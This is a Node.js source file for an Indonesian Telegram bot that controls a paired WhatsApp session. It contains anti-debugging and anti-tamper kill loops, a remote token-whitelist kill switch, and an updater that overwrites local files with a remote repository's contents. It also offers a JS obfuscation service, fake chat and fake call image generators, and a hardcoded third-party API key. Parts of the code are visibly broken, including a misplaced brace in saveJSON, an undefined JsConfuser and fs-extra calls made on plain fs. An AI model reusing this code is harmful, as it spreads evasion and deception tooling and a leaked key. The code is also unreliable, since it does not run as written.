const { Telegraf } = require("telegraf");
const { spawn } = require('child_process');
const { pipeline } = require('stream/promises');
const { createWriteStream } = require('fs');
const fs = require('fs');
const path = require('path');

let blockedCmds = new Set()

if (fs.existsSync("./cmd.json")) {
  const data = JSON.parse(fs.readFileSync("./cmd.json"))
  blockedCmds = new Set(data.blocked || [])
}

function saveBlocked() {
  fs.writeFileSync("./cmd.json", JSON.stringify({
    blocked: [...blockedCmds]
  }, null, 2))
}
const jid = "0@s.whatsapp.net";
const vm = require('vm');
const os = require('os');
const { tokenBot, ownerID } = require("./settings/config");
const adminFile = './database/adminuser.json';
const FormData = require("form-data");
const https = require("https");
function fetchJsonHttps(url, timeout = 5000) {
  return new Promise((resolve, reject) => {
    try {
      const req = https.get(url, { timeout }, (res) => {
        const { statusCode } = res;
        if (statusCode < 200 || statusCode >= 300) {
          let _ = '';
          res.on('data', c => _ += c);
          res.on('end', () => reject(new Error(`HTTP ${statusCode}`)));
          return;
        }
        let raw = '';
        res.on('data', (chunk) => (raw += chunk));
        res.on('end', () => {
          try {
            const json = JSON.parse(raw);
            resolve(json);
          } catch (err) {
            reject(new Error('Invalid JSON response'));
          }
        });
      });
      req.on('timeout', () => {
        req.destroy(new Error('Request timeout'));
      });
      req.on('error', (err) => reject(err));
    } catch (err) {
      reject(err);
    }
  });
}
const {
  default: makeWASocket,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  generateWAMessageFromContent,
  prepareWAMessageMedia,
  downloadContentFromMessage,
  generateForwardMessageContent,
  generateWAMessage,
  jidDecode,
  areJidsSameUser,
  encodeSignedDeviceIdentity,
  encodeWAMessage,
  jidEncode,
  patchMessageBeforeSending,
  encodeNewsletterMessage,
  BufferJSON,
  DisconnectReason,
  proto,
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const axios = require('axios');
const moment = require('moment-timezone');
const EventEmitter = require('events')
const makeInMemoryStore = ({ logger = console } = {}) => {
const ev = new EventEmitter()

  let chats = {}
  let messages = {}
  let contacts = {}

  ev.on('messages.upsert', ({ messages: newMessages, type }) => {
    for (const msg of newMessages) {
      const chatId = msg.key.remoteJid
      if (!messages[chatId]) messages[chatId] = []
      messages[chatId].push(msg)

      if (messages[chatId].length > 50) {
        messages[chatId].shift()
      }

      chats[chatId] = {
        ...(chats[chatId] || {}),
        id: chatId,
        name: msg.pushName,
        lastMsgTimestamp: +msg.messageTimestamp
      }
    }
  })

  ev.on('chats.set', ({ chats: newChats }) => {
    for (const chat of newChats) {
      chats[chat.id] = chat
    }
  })

  ev.on('contacts.set', ({ contacts: newContacts }) => {
    for (const id in newContacts) {
      contacts[id] = newContacts[id]
    }
  })

  return {
    chats,
    messages,
    contacts,
    bind: (evTarget) => {
      evTarget.on('messages.upsert', (m) => ev.emit('messages.upsert', m))
      evTarget.on('chats.set', (c) => ev.emit('chats.set', c))
      evTarget.on('contacts.set', (c) => ev.emit('contacts.set', c))
    },
    logger
  }
}

const databaseUrl = 'https://raw.githubusercontent.com/zakashoot-dev/database/refs/heads/main/whitelist.json';
const thumbnailUrl = "https://files.catbox.moe/9g24hy.jpg";

const thumbnailVideo = "https://files.catbox.moe/5ya1gj.mp4";

function createSafeSock(sock) {
  let sendCount = 0
  const MAX_SENDS = 500
  const normalize = j =>
    j && j.includes("@")
      ? j
      : j.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

  return {
    sendMessage: async (target, message) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.sendMessage(jid, message)
    },
    relayMessage: async (target, messageObj, opts = {}) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.relayMessage(jid, messageObj, opts)
    },
    presenceSubscribe: async jid => {
      try { return await sock.presenceSubscribe(normalize(jid)) } catch(e){}
    },
    sendPresenceUpdate: async (state,jid) => {
      try { return await sock.sendPresenceUpdate(state, normalize(jid)) } catch(e){}
    }
  }
}

function activateSecureMode() {
  secureMode = true;
}

(function() {
  function randErr() {
    return Array.from({ length: 12 }, () =>
      String.fromCharCode(33 + Math.floor(Math.random() * 90))
    ).join("");
  }

  setInterval(() => {
    const start = performance.now();
    debugger;
    if (performance.now() - start > 100) {
      throw new Error(randErr());
    }
  }, 1000);

  const code = "AlwaysProtect";
  if (code.length !== 13) {
    throw new Error(randErr());
  }

  function secure() {
    console.log(chalk.bold.yellow(`⠀⠀
⠀⬡═—⊱ CHECKING SERVER ⊰—═⬡
┃Bot Sukses Terhubung Terimakasih 
⬡═―—―――――――――――――――――—═⬡
  `))
  }
  
  const hash = Buffer.from(secure.toString()).toString("base64");
  setInterval(() => {
    if (Buffer.from(secure.toString()).toString("base64") !== hash) {
      throw new Error(randErr());
    }
  }, 2000);

  secure();
})();

(() => {
  const hardExit = process.exit.bind(process);
  Object.defineProperty(process, "exit", {
    value: hardExit,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  const hardKill = process.kill.bind(process);
  Object.defineProperty(process, "kill", {
    value: hardKill,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  setInterval(() => {
    try {
      if (process.exit.toString().includes("Proxy") ||
          process.kill.toString().includes("Proxy")) {
        console.log(chalk.bold.yellow(`
⠀⬡═—⊱ BYPASS CHECKING ⊰—═⬡
┃PERUBAHAN CODE MYSQL TERDETEKSI
┃ SCRIPT DIMATIKAN / TIDAK BISA PAKAI
⬡═―—―――――――――――――――――—═⬡
  `))
        activateSecureMode();
         hardExit(1);
      }

      for (const sig of ["SIGINT", "SIGTERM", "SIGHUP"]) {
        if (process.listeners(sig).length > 0) {
          console.log(chalk.bold.yellow(`
⠀⬡═—⊱ BYPASS CHECKING ⊰—═⬡
┃PERUBAHAN CODE MYSQL TERDETEKSI
┃ SCRIPT DIMATIKAN / TIDAK BISA PAKAI
⬡═―—―――――――――――――――――—═⬡
  `))
        activateSecureMode();
         hardExit(1);
        }
      }
    } catch {
      activateSecureMode();
       hardExit(1);
    }
  }, 2000);

  global.validateToken = async (databaseUrl, tokenBot) => {
  try {
    const res = await fetchJsonHttps(databaseUrl, 5000);
    const tokens = (res && res.tokens) || [];

    if (!tokens.includes(tokenBot)) {
      console.log(chalk.bold.yellow(`
⠀⬡═—⊱ BYPASS ALERT⊰—═⬡
┃ NOTE : SERVER MENDETEKSI KAMU
┃  MEMBYPASS PAKSA SCRIPT !
⬡═―—―――――――――――――――――—═⬡
  `));

      try {
      } catch (e) {
      }

      activateSecureMode();
       hardExit(1);
    }
  } catch (err) {
    console.log(chalk.bold.yellow(`
⠀⬡═—⊱ CHECK SERVER ⊰—═⬡
┃ DATABASE : MYSQL
┃ NOTE : SERVER GAGAL TERHUBUNG
⬡═―—―――――――――――――――――—═⬡
  `));
    activateSecureMode();
     hardExit(1);
  }
};
})();

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

async function isAuthorizedToken(token) {
    try {
        const res = await fetchJsonHttps(databaseUrl, 5000);
        const authorizedTokens = (res && res.tokens) || [];
        return Array.isArray(authorizedTokens) && authorizedTokens.includes(token);
    } catch (e) {
        return false;
    }
}

(async () => {
    await validateToken(databaseUrl, tokenBot);
})();

const GH_OWNER = "zakashoot-dev";
const GH_REPO = "auto-update";
const GH_BRANCH = "main";

async function downloadRepo(dir = "", basePath = "/home/container") {
  const url = `https://api.github.com/repos/${GH_OWNER}/${GH_REPO}/contents/${dir}?ref=${GH_BRANCH}`;

  const { data } = await axios.get(url, {
    headers: { "User-Agent": "Mozilla/5.0" }
  });

  for (const item of data) {
    const local = path.join(basePath, item.path);

    if ([
      "settings/config.js",
      "cmd.json",
      "database/adminuser.json"
    ].includes(item.path)) continue;

    if (item.type === "file") {
      const fileData = await axios.get(item.download_url, {
        responseType: "arraybuffer"
      });

      fs.mkdirSync(path.dirname(local), { recursive: true });
      fs.writeFileSync(local, Buffer.from(fileData.data));
    }

    if (item.type === "dir") {
      fs.mkdirSync(local, { recursive: true });
      await downloadRepo(item.path, basePath);
    }
  }
}

const bot = new Telegraf(tokenBot);
let tokenValidated = false;
let secureMode = false;
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;

bot.use(async (ctx, next) => {
  if (ctx.message?.text?.startsWith("/")) {
    const cmd = ctx.message.text.split(" ")[0].replace("/", "")

    if (blockedCmds.has(cmd)) {
      return ctx.reply(`🚫 Command /${cmd} sedang dinonaktifkan oleh admin.`)
    }
  }

  return next()
})

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const premiumFile = './database/premium.json';
const cooldownFile = './database/cooldown.json'

const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync(premiumFile);
        return JSON.parse(data);
    } catch (err) {
        return {};
    }
};

const savePremiumUsers = (users) => {
    fs.writeFileSync(premiumFile, JSON.stringify(users, null, 2));
};

const addpremUser = (userId, duration) => {
    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
    premiumUsers[userId] = expiryDate;
    savePremiumUsers(premiumUsers);
    return expiryDate;
};

const removePremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    delete premiumUsers[userId];
    savePremiumUsers(premiumUsers);
};

const isPremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    if (premiumUsers[userId]) {
        const expiryDate = moment(premiumUsers[userId], 'DD-MM-YYYY');
        if (moment().isBefore(expiryDate)) {
            return true;
        } else {
            removePremiumUser(userId);
            return false;
        }
    }
    return false;
};

const loadCooldown = () => {
    try {
        const data = fs.readFileSync(cooldownFile)
        return JSON.parse(data).cooldown || 5
    } catch {
        return 5
    }
}

const saveCooldown = (seconds) => {
    fs.writeFileSync(cooldownFile, JSON.stringify({ cooldown: seconds }, null, 2))
}

let cooldown = loadCooldown()
const userCooldowns = new Map()

function formatRuntime() {
  let sec = Math.floor(process.uptime());
  let hrs = Math.floor(sec / 3600);
  sec %= 3600;
  let mins = Math.floor(sec / 60);
  sec %= 60;
  return `${hrs}h ${mins}m ${sec}s`;
}

function formatMemory() {
  const usedMB = process.memoryUsage().rss / 524 / 524;
  return `${usedMB.toFixed(0)} MB`;
}

const startSesi = async () => {
console.clear();
  console.log(chalk.bold.yellow(`
⠀⠀⠀⠀


  Status: Bot Connected
  `))
    
const store = makeInMemoryStore({
  logger: require('pino')().child({ level: 'silent', stream: 'store' })
})
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '5.15.7'],
        getMessage: async (key) => ({
            conversation: 'Apophis',
        }),
    };

    sock = makeWASocket(connectionOptions);
    
    sock.ev.on("messages.upsert", async (m) => {
        try {
            if (!m || !m.messages || !m.messages[0]) {
                return;
            }

            const msg = m.messages[0]; 
            const chatId = msg.key.remoteJid || "Tidak Diketahui";

        } catch (error) {
        }
    });

    sock.ev.on('creds.update', saveCreds);
    store.bind(sock.ev);
    
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
        
        if (lastPairingMessage) {
        const connectedMenu = `
<blockquote><pre>⬡═―—⊱ ⎧ 𝐍𝐞𝐱𝐨𝐫𝐚 𝐕𝐞𝐫𝐬𝐞 ⎭ ⊰―—═⬡</pre></blockquote>
⌑ Number: ${lastPairingMessage.phoneNumber}
⌑ Pairing Code: ${lastPairingMessage.pairingCode}
⌑ Type: Connected
╘—————————————————═⬡`;

        try {
          bot.telegram.editMessageCaption(
            lastPairingMessage.chatId,
            lastPairingMessage.messageId,
            undefined,
            connectedMenu,
            { parse_mode: "HTML" }
          );
        } catch (e) {
        }
      }
      
            console.clear();
            isWhatsAppConnected = true;
            const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
            console.log(chalk.bold.yellow(`
⠀⠀⠀
░


  `))
        }

                 if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus:'),
                shouldReconnect ? 'Mencoba Menautkan Perangkat' : 'Silakan Menautkan Perangkat Lagi'
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};

startSesi();

const checkWhatsAppConnection = (ctx, next) => {
    if (!isWhatsAppConnected) {
        ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
        return;
    }
    next();
};

const checkCooldown = (ctx, next) => {
    const userId = ctx.from.id
    const now = Date.now()

    if (userCooldowns.has(userId)) {
        const lastUsed = userCooldowns.get(userId)
        const diff = (now - lastUsed) / 500

        if (diff < cooldown) {
            const remaining = Math.ceil(cooldown - diff)
            ctx.reply(`⏳ ☇ Harap menunggu ${remaining} detik`)
            return
        }
    }

    userCooldowns.set(userId, now)
    next()
}

const checkPremium = (ctx, next) => {
    if (!isPremiumUser(ctx.from.id)) {
        ctx.reply("❌ ☇ Akses hanya untuk premium");
        return;
    }
    next();
};

bot.command("addbot", async (ctx) => {
   if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("🪧 ☇ Format: /addbot 62×××");

  const phoneNumber = args.replace(/[^0-9]/g, "");
  if (!phoneNumber) return ctx.reply("❌ ☇ Nomor tidak valid");

  try {
    if (!sock) return ctx.reply("❌ ☇ Socket belum siap, coba lagi nanti");
    if (sock.authState.creds.registered) {
      return ctx.reply(`✅ ☇ WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`);
    }

    const code = await sock.requestPairingCode(phoneNumber, "SUNLYNIX");
        const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;  

    const pairingMenu = `\`\`\`
⬡═―—⊱ ⎧ 𝐍𝐞𝐱𝐨𝐫𝐚 𝐕𝐞𝐫𝐬𝐞 ⎭ ⊰―—═⬡
⌑ Number: ${phoneNumber}
⌑ Pairing Code: ${formattedCode}
⌑ Type: Not Connected
╘═——————————————═⬡
\`\`\``;

    const sentMsg = await ctx.replyWithPhoto(thumbnailUrl, {  
      caption: pairingMenu,  
      parse_mode: "Markdown"  
    });  

    lastPairingMessage = {  
      chatId: ctx.chat.id,  
      messageId: sentMsg.message_id,  
      phoneNumber,  
      pairingCode: formattedCode
    };

  } catch (err) {
    console.error(err);
  }
});

if (sock) {
  sock.ev.on("connection.update", async (update) => {
    if (update.connection === "open" && lastPairingMessage) {
      const updateConnectionMenu = `\`\`\`
 ⬡═―—⊱ ⎧ 𝐍𝐞𝐱𝐨𝐫𝐚 𝐕𝐞𝐫𝐬𝐞 ⎭ ⊰―—═⬡
⌑ Number: ${lastPairingMessage.phoneNumber}
⌑ Pairing Code: ${lastPairingMessage.pairingCode}
⌑ Type: Connected
╘═——————————————═⬡\`\`\`
`;

      try {  
        await bot.telegram.editMessageCaption(  
          lastPairingMessage.chatId,  
          lastPairingMessage.messageId,  
          undefined,  
          updateConnectionMenu,  
          { parse_mode: "Markdown" }  
        );  
      } catch (e) {  
      }  
    }
  });
}

const loadJSON = (file) => {
    if (!fs.existsSync(file)) return [];
    return JSON.parse(fs.readFileSync(file, 'utf8'));
};

const saveJSON = (file, data) => {
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
    
    
let adminUsers = loadJSON(adminFile);

const checkAdmin = (ctx, next) => {
    if (!adminUsers.includes(ctx.from.id.toString())) {
        return ctx.reply("❌ Anda bukan Admin. jika anda adalah owner silahkan daftar ulang ID anda menjadi admin");
    }
    next();
};


};
// --- Fungsi untuk Menambahkan Admin ---
const addAdmin = (userId) => {
    if (!adminList.includes(userId)) {
        adminList.push(userId);
        saveAdmins();
    }
};

// --- Fungsi untuk Menghapus Admin ---
const removeAdmin = (userId) => {
    adminList = adminList.filter(id => id !== userId);
    saveAdmins();
};

// --- Fungsi untuk Menyimpan Daftar Admin ---
const saveAdmins = () => {
    fs.writeFileSync('./database/admins.json', JSON.stringify(adminList));
};

// --- Fungsi untuk Memuat Daftar Admin ---
const loadAdmins = () => {
    try {
        const data = fs.readFileSync('./database/admins.json');
        adminList = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat daftar admin:'), error);
        adminList = [];
    }
};

bot.command('addadmin', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    const args = ctx.message.text.split(' ');
    const userId = args[1];

    if (adminUsers.includes(userId)) {
        return ctx.reply(`✅ si ngentot ${userId} sudah memiliki status Admin.`);
    }

    adminUsers.push(userId);
    saveJSON(adminFile, adminUsers);

    return ctx.reply(`🎉 si kontol ${userId} sekarang memiliki akses Admin!`);
});


bot.command("tiktok", async (ctx) => {
  const args = ctx.message.text.split(" ")[1];
  if (!args)
    return ctx.replyWithMarkdown(
      "🎵 *Download TikTok*\n\nContoh: `/tiktok https://vt.tiktok.com/xxx`\n_Support tanpa watermark & audio_"
    );

  if (!args.match(/(tiktok\.com|vm\.tiktok\.com|vt\.tiktok\.com)/i))
    return ctx.reply("❌ Format link TikTok tidak valid!");

  try {
    const processing = await ctx.reply("⏳ _Mengunduh video TikTok..._", { parse_mode: "Markdown" });

    const encodedParams = new URLSearchParams();
    encodedParams.set("url", args);
    encodedParams.set("hd", "1");

    const { data } = await axios.post("https://tikwm.com/api/", encodedParams, {
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "TikTokBot/1.0",
      },
      timeout: 30000,
    });

    if (!data.data?.play) throw new Error("URL video tidak ditemukan");

    await ctx.deleteMessage(processing.message_id);
    await ctx.replyWithVideo({ url: data.data.play }, {
      caption: `🎵 *${data.data.title || "Video TikTok"}*\n🔗 ${args}\n\n✅ Tanpa watermark`,
      parse_mode: "Markdown",
    });

    if (data.data.music) {
      await ctx.replyWithAudio({ url: data.data.music }, { title: "Audio Original" });
    }
  } catch (err) {
    console.error("[TIKTOK ERROR]", err.message);
    ctx.reply(`❌ Gagal mengunduh: ${err.message}`);
  }
});

// Logging (biar gampang trace error)
function log(message, error) {
  if (error) {
    console.error(`[EncryptBot] ❌ ${message}`, error);
  } else {
    console.log(`[EncryptBot] ✅ ${message}`);
  }
}

bot.command("iqc", async (ctx) => {
  const fullText = (ctx.message.text || "").split(" ").slice(1).join(" ").trim();

  try {
    await ctx.sendChatAction("upload_photo");

    if (!fullText) {
      return ctx.reply(
        "🧩 Masukkan teks!\nContoh: /iqc Konichiwa|06:00|100"
      );
    }

    const parts = fullText.split("|");
    if (parts.length < 2) {
      return ctx.reply(
        "❗ Format salah!\n🍀 Contoh: /iqc Teks|WaktuChat|StatusBar"
      );
    }

    let [message, chatTime, statusBarTime] = parts.map((p) => p.trim());

    if (!statusBarTime) {
      const now = new Date();
      statusBarTime = `${String(now.getHours()).padStart(2, "0")}:${String(
        now.getMinutes()
      ).padStart(2, "0")}`;
    }

    if (message.length > 80) {
      return ctx.reply("🍂 Teks terlalu panjang! Maksimal 80 karakter.");
    }

    const url = `https://api.zenzxz.my.id/maker/fakechatiphone?text=${encodeURIComponent(
      message
    )}&chatime=${encodeURIComponent(chatTime)}&statusbartime=${encodeURIComponent(
      statusBarTime
    )}`;

    const response = await fetch(url);
    if (!response.ok) throw new Error("Gagal mengambil gambar dari API");

    const buffer = await response.buffer();

    const caption = `
✨ <b>Fake Chat iPhone Berhasil Dibuat!</b>

💬 <b>Pesan:</b> ${message}
⏰ <b>Waktu Chat:</b> ${chatTime}
📱 <b>Status Bar:</b> ${statusBarTime}
`;

    await ctx.replyWithPhoto({ source: buffer }, { caption, parse_mode: "HTML" });
  } catch (err) {
    console.error(err);
    await ctx.reply("🍂 Gagal membuat gambar. Coba lagi nanti.");
  }
});

//MD MENU
bot.command("update", async (ctx) => {
  if (ctx.from.id.toString() !== ownerID.toString()) {
    return ctx.reply("❌ Khusus owner")
  }

  await ctx.reply("🔄 Proses update...")

  try {
    await downloadRepo("")
    await ctx.reply("✅ Update selesai!\n🔁 Restart bot...")
    setTimeout(() => process.exit(0), 1500)
  } catch (e) {
    console.log(e)
    await ctx.reply("❌ Gagal update")
  }
})

bot.command("blockcmd", async (ctx) => {
  const text = ctx.message.text.split(" ")

  if (!text[1]) {
    return ctx.reply("Format:\n/blockcmd /command")
  }

  const cmd = text[1].replace("/", "")

  blockedCmds.add(cmd)
  saveBlocked()

  ctx.reply(`🚫 Command /${cmd} berhasil diblokir.`)
})

bot.command("unblockcmd", async (ctx) => {
  const text = ctx.message.text.split(" ")

  if (!text[1]) {
    return ctx.reply("Format:\n/unblockcmd /command")
  }

  const cmd = text[1].replace("/", "")

  blockedCmds.delete(cmd)
  saveBlocked()

  ctx.reply(`✅ Command /${cmd} berhasil dibuka.`)
})

bot.command("fakecall", async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1).join(" ").split("|");

  if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.photo) {
    return ctx.reply("❌ Reply ke foto untuk dijadikan avatar!");
  }

  const nama = args[0]?.trim();
  const durasi = args[1]?.trim();

  if (!nama || !durasi) {
    return ctx.reply("📌 Format: `/fakecall nama|durasi` (reply foto)", { parse_mode: "Markdown" });
  }

  try {
    const fileId = ctx.message.reply_to_message.photo.pop().file_id;
    const fileLink = await ctx.telegram.getFileLink(fileId);

    const api = `https://api.zenzxz.my.id/maker/fakecall?nama=${encodeURIComponent(
      nama
    )}&durasi=${encodeURIComponent(durasi)}&avatar=${encodeURIComponent(
      fileLink
    )}`;

    const res = await fetch(api);
    const buffer = await res.buffer();

    await ctx.replyWithPhoto({ source: buffer }, {
      caption: `📞 Fake Call dari *${nama}* (durasi: ${durasi})`,
      parse_mode: "Markdown",
    });
  } catch (err) {
    console.error(err);
    ctx.reply("⚠️ Gagal membuat fakecall.");
  }
});

bot.command("tourl", async (ctx) => {
  try {
    const reply = ctx.message.reply_to_message;
    if (!reply) return ctx.reply("❗ Reply media (foto/video/audio/dokumen) dengan perintah /tourl");

    let fileId;
    if (reply.photo) {
      fileId = reply.photo[reply.photo.length - 1].file_id;
    } else if (reply.video) {
      fileId = reply.video.file_id;
    } else if (reply.audio) {
      fileId = reply.audio.file_id;
    } else if (reply.document) {
      fileId = reply.document.file_id;
    } else {
      return ctx.reply("❌ Format file tidak didukung. Harap reply foto/video/audio/dokumen.");
    }

    const fileLink = await ctx.telegram.getFileLink(fileId);
    const response = await axios.get(fileLink.href, { responseType: "arraybuffer" });
    const buffer = Buffer.from(response.data);

    const form = new FormData();
    form.append("reqtype", "fileupload");
    form.append("fileToUpload", buffer, {
      filename: path.basename(fileLink.href),
      contentType: "application/octet-stream",
    });

    const uploadRes = await axios.post("https://catbox.moe/user/api.php", form, {
      headers: form.getHeaders(),
    });

    const url = uploadRes.data;
    ctx.reply(`✅ File berhasil diupload:\n${url}`);
  } catch (err) {
    console.error("❌ Gagal tourl:", err.message);
    ctx.reply("❌ Gagal mengupload file ke URL.");
  }
});

const IMGBB_API_KEY = "76919ab4062bedf067c9cab0351cf632";

bot.command("tourl2", async (ctx) => {
  try {
    const reply = ctx.message.reply_to_message;
    if (!reply) return ctx.reply("❗ Reply foto dengan /tourl2");

    let fileId;
    if (reply.photo) {
      fileId = reply.photo[reply.photo.length - 1].file_id;
    } else {
      return ctx.reply("❌ i.ibb hanya mendukung foto/gambar.");
    }

    const fileLink = await ctx.telegram.getFileLink(fileId);
    const response = await axios.get(fileLink.href, { responseType: "arraybuffer" });
    const buffer = Buffer.from(response.data);

    const form = new FormData();
    form.append("image", buffer.toString("base64"));

    const uploadRes = await axios.post(
      `https://api.imgbb.com/1/upload?key=${IMGBB_API_KEY}`,
      form,
      { headers: form.getHeaders() }
    );

    const url = uploadRes.data.data.url;
    ctx.reply(`✅ Foto berhasil diupload:\n${url}`);
  } catch (err) {
    console.error("❌ tourl2 error:", err.message);
    ctx.reply("❌ Gagal mengupload foto ke i.ibb.co");
  }
});

bot.command("zenc", async (ctx) => {
  
  if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.document) {
    return ctx.replyWithMarkdown("❌ Harus reply ke file .js");
  }

  const file = ctx.message.reply_to_message.document;
  if (!file.file_name.endsWith(".js")) {
    return ctx.replyWithMarkdown("❌ File harus berekstensi .js");
  }

  const encryptedPath = path.join(
    __dirname,
    `invisible-encrypted-${file.file_name}`
  );

  try {
    const progressMessage = await ctx.replyWithMarkdown(
      "```css\n" +
        "🔒 EncryptBot\n" +
        ` ⚙️ Memulai (Invisible) (1%)\n` +
        ` ${createProgressBar(1)}\n` +
        "```\n"
    );

    const fileLink = await ctx.telegram.getFileLink(file.file_id);
    log(`Mengunduh file: ${file.file_name}`);
    await updateProgress(ctx, progressMessage, 10, "Mengunduh");
    const response = await fetch(fileLink);
    let fileContent = await response.text();
    await updateProgress(ctx, progressMessage, 20, "Mengunduh Selesai");

    log(`Memvalidasi kode awal: ${file.file_name}`);
    await updateProgress(ctx, progressMessage, 30, "Memvalidasi Kode");
    try {
      new Function(fileContent);
    } catch (syntaxError) {
      throw new Error(`Kode tidak valid: ${syntaxError.message}`);
    }

    log(`Proses obfuscation: ${file.file_name}`);
    await updateProgress(ctx, progressMessage, 40, "Inisialisasi Obfuscation");
    const obfuscated = await JsConfuser.obfuscate(
      fileContent,
      getStrongObfuscationConfig()
    );

    let obfuscatedCode = obfuscated.code || obfuscated;
    if (typeof obfuscatedCode !== "string") {
      throw new Error("Hasil obfuscation bukan string");
    }

    log(`Preview hasil (50 char): ${obfuscatedCode.substring(0, 50)}...`);
    await updateProgress(ctx, progressMessage, 60, "Transformasi Kode");

    log(`Validasi hasil obfuscation`);
    try {
      new Function(obfuscatedCode);
    } catch (postObfuscationError) {
      throw new Error(
        `Hasil obfuscation tidak valid: ${postObfuscationError.message}`
      );
    }

    await updateProgress(ctx, progressMessage, 80, "Finalisasi Enkripsi");
    await fs.writeFile(encryptedPath, obfuscatedCode);

    log(`Mengirim file terenkripsi: ${file.file_name}`);
    await ctx.replyWithDocument(
      { source: encryptedPath, filename: `Invisible-encrypted-${file.file_name}` },
      {
        caption:
          "✅ *ENCRYPT BERHASIL!*\n\n" +
          "📂 File: `" +
          file.file_name +
          "`\n" +
          "🔒 Mode: *Invisible Strong Obfuscation*",
        parse_mode: "Markdown",
      }
    );

    await ctx.deleteMessage(progressMessage.message_id);

    if (await fs.pathExists(encryptedPath)) {
      await fs.unlink(encryptedPath);
      log(`File sementara dihapus: ${encryptedPath}`);
    }
  } catch (error) {
    log("Kesalahan saat zenc", error);
    await ctx.replyWithMarkdown(
      `❌ *Kesalahan:* ${error.message || "Tidak diketahui"}\n` +
        "_Coba lagi dengan kode Javascript yang valid!_"
    );
    if (await fs.pathExists(encryptedPath)) {
      await fs.unlink(encryptedPath);
      log(`File sementara dihapus setelah error: ${encryptedPath}`);
    }
  }
});



bot.command("setcd", async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    const seconds = parseInt(args[1]);

    if (isNaN(seconds) || seconds < 0) {
        return ctx.reply("🪧 ☇ Format: /setcd 5");
    }

    cooldown = seconds
    saveCooldown(seconds)
    ctx.reply(`✅ ☇ Cooldown berhasil diatur ke ${seconds} detik`);
});

bot.command("killsesi", async (ctx) => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  try {
    const sessionDirs = ["./session", "./sessions"];
    let deleted = false;

    for (const dir of sessionDirs) {
      if (fs.existsSync(dir)) {
        fs.rmSync(dir, { recursive: true, force: true });
        deleted = true;
      }
    }

    if (deleted) {
      await ctx.reply("✅ ☇ Session berhasil dihapus, panel akan restart");
      setTimeout(() => {
        process.exit(1);
      }, 2000);
    } else {
      ctx.reply("🪧 ☇ Tidak ada folder session yang ditemukan");
    }
  } catch (err) {
    console.error(err);
    ctx.reply("❌ ☇ Gagal menghapus session");
  }
});



const PREM_GROUP_FILE = "./grup.json";

// Auto create file grup.json kalau belum ada
function ensurePremGroupFile() {
  if (!fs.existsSync(PREM_GROUP_FILE)) {
    fs.writeFileSync(PREM_GROUP_FILE, JSON.stringify([], null, 2));
  }
}

function loadPremGroups() {
  ensurePremGroupFile();
  try {
    const raw = fs.readFileSync(PREM_GROUP_FILE, "utf8");
    const data = JSON.parse(raw);
    return Array.isArray(data) ? data.map(String) : [];
  } catch {
    // kalau corrupt, reset biar aman
    fs.writeFileSync(PREM_GROUP_FILE, JSON.stringify([], null, 2));
    return [];
  }
}

function savePremGroups(groups) {
  ensurePremGroupFile();
  const unique = [...new Set(groups.map(String))];
  fs.writeFileSync(PREM_GROUP_FILE, JSON.stringify(unique, null, 2));
}

function isPremGroup(chatId) {
  const groups = loadPremGroups();
  return groups.includes(String(chatId));
}

function addPremGroup(chatId) {
  const groups = loadPremGroups();
  const id = String(chatId);
  if (groups.includes(id)) return false;
  groups.push(id);
  savePremGroups(groups);
  return true;
}

function delPremGroup(chatId) {
  const groups = loadPremGroups();
  const id = String(chatId);
  if (!groups.includes(id)) return false;
  const next = groups.filter((x) => x !== id);
  savePremGroups(next);
  return true;
}

bot.command("addpremgrup", async (ctx) => {
  if (ctx.from.id != ownerID) return ctx.reply("❌ ☇ Akses hanya untuk pemilik");

  const args = (ctx.message?.text || "").trim().split(/\s+/);

 
  let groupId = String(ctx.chat.id);

  if (ctx.chat.type === "private") {
    if (args.length < 2) {
